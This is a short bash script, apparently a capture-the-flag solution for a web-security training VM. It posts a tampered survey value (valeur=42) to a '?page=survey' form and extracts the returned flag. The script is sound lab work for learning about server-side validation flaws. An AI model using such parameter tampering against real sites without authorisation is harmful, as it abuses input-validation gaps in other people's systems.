#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/?page=survey"

response=$(curl -s -X POST -d "valeur=42" -d "sujet=42" "$url" | grep "flag")
response=$(cut -f6 -d " " <<< $response | cut -c -64)
echo "FLAG: ${response}"